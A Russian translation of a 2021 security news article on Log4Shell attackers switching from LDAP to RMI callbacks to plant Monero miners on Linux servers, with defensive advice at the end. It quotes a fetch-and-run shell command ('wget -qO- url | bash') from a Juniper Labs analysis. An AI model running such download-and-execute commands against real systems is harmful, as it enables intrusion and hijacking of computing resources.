---
title: "Злоумышленники, использующие уязвимость Log4j, перешли к установке майнеров Monero через RMI"
date: "2021-12-16"
categories:
  - "Новости"
tags:
  - "Взлом"
thumbnail: "img/post/2021-12-16-log4j-attackers-switch-to-injecting-monero-miners-via-rmi/01.jpg"
lead: "Неизвестные злоумышленники, использующие уязвимость Log4j в Apache, переключили обратные ссылки URL сервиса LDAP на RMI или, возможно, задействовали сразу оба варианта, чтобы до максимума повысить шансы на успех."
pager: true
toc: false
sidebar: "right"
widgets:
  - "recent"
  - "taglist"
---

Такой переход является достойным особого внимания развитием продолжающейся атаки, и непременно должен учитываться теми, кто будет заниматься разработкой мер защиты, что позволит обезопасить все возможные векторы.
До настоящего времени подобная тенденция в основном наблюдалась в случае со злоумышленниками, пытавшимися путём взлома контролировать вычислительные ресурсы для майнинга Monero, но это вовсе не исключает того, что и другие недобросовестные пользователи в любой момент смогут прибегнуть к данному способу.

### _Переход с LDAP на RMI_

Большинство атак, целью которых становилась уязвимость Log4j "Log4Shell", проводилось через сервис LDAP (Lightweight Directory Access Protocol).

Переход на API RMI (Remote Method Invocation) сперва может показаться алогичным, учитывая тот факт, что данный механизм, как правило, является предметом дополнительных проверок и ограничений, но далеко не всегда это так.

Некоторые версии виртуальной машины JVM (Java Virtual Machine) не следуют жёсткой политике, и сам по себе RMI иногда может становиться более доступным каналом для реализации RCE (удалённого выполнения кода), чем LDAP.

Более того, запросы LDAP теперь можно уверенно считать одним звеньев в цепочке заражения, и поэтому сегодня они уже более тщательно отслеживаются механизмами антивирусной защиты.

Например, многие инструменты IDS/IPS в настоящее время фильтруют запросы, используя JNDI и LDAP, поэтому, существует вероятность, что на данном этапе RMI будет проигнорирован.

![02](/img/post/2021-12-16-log4j-attackers-switch-to-injecting-monero-miners-via-rmi/02.jpg)

_Запрос POST, который отправлялся уязвимым целям_  
_Источник: Juniper Labs_

В некоторых случаях специалистами из Juniper было отмечено, что в запросах POST (HTTP) присутствовали сразу оба сервиса: RMI и LDAP.

Как бы то ни было, у всех злоумышленников, пытавшихся воспользоваться уязвимостью Log4Shell, была одна и та же цель: отправка эксплойта, который был бы затем принят и обработан уязвимым сервером Log4j, после чего код был бы выполнен на целевом устройстве.

В результате проведения описанной выше атаки происходит переполнение оболочки Bash, и в итоге с удалённого сервера загружается скрипт оболочки.

«Этот код при помощи скриптового движка JavaScript выдаёт команду оболочки Bash, используя при этом конструкцию `$@|bash` для выполнения загруженного сценария, — говорится в отчёте [Juniper Labs](https://blogs.juniper.net/en-us/threat-research/log4j-vulnerability-attackers-shift-focus-from-ldap-to-rmi). — Во время выполнения этой команды оболочка Bash передаёт команды злоумышленника другому процессу Bash, `wget -qO- url | bash`, который в свою очередь скачивает и выполняет сценарий оболочки на целевой машине».

### _Взлом и использование вычислительных ресурсов с целью наживы_

При проведении атак, выявленных специалистами Juniper Labs, целью злоумышленников был майнинг Monero с помощью взломанных серверов. При этом всё выглядело абсолютно невинно, как если бы не делалось для того, чтобы «навредить кому бы то ни было».

![03](/img/post/2021-12-16-log4j-attackers-switch-to-injecting-monero-miners-via-rmi/03.jpg)

_Сообщение злоумышленников, найденное в загруженном сценарии оболочки_  
_Источник: Juniper Labs_

Целью майнеров стали системы Linux x84_64, а устойчивость присутствия обеспечивалась через подсистему cron.

Несмотря на то, что до сих пор целью большинства атак становились системы Linux, согласно информации, опубликованной [CheckPoint](https://research.checkpoint.com/2021/stealthloader-malware-leveraging-log4shell/), аналитиками компании были обнаружены первые выполняемые файлы Win32, использующие Log4Shell под названием StealthLoader.

### _Найти, обновить, отчитаться_

Единственным осуществимым средством защиты от одной из наиболее серьёзных обнаруженных за последнее время уязвимостей является обновление Log4j до версии [2.16.0](https://logging.apache.org/log4j/2.x/security.html).

Кроме того, сетевым администраторам рекомендуется пристально следить за разделом Apache по безопасности в ожидании обновлений, и устанавливать их сразу же после публикации.

Руководство по реализации защиты от атаки и подробную техническую информацию можно найти на [странице СISA](https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance), посвящённой Log4Shell.

Помимо прочего, существует довольно [полный список продуктов](https://www.bleepingcomputer.com/news/security/log4j-list-of-vulnerable-products-and-vendor-advisories/), пострадавших от CVE-2021-44228, а в этом [репозитории GitHub](https://github.com/cisagov/log4j-affected-db) содержится постоянно обновляемый список справочных материалов от поставщиков.

Наконец, если вы вдруг заметите, что с вашими системами происходит что-то подозрительное, сообщите об этом в [ФБР](https://www.fbi.gov/resources/victim-services/seeking-victim-information/seeking-victims-of-log4j-vulnerability) или [CISA](https://www.cisa.gov/uscert/report) — они очень активно работают над тем, чтобы избежать дальнейшего ущерба и как-то исправить сложившуюся ситуацию.

---

_Источник: [Log4j attackers switch to injecting Monero miners via RMI](https://www.bleepingcomputer.com/news/security/log4j-attackers-switch-to-injecting-monero-miners-via-rmi/_

_Перевод: [Mr. Pickles](https://t.me/v1docq47)_  
_Коррекция: [Kukima](https://t.me/Kukima)_
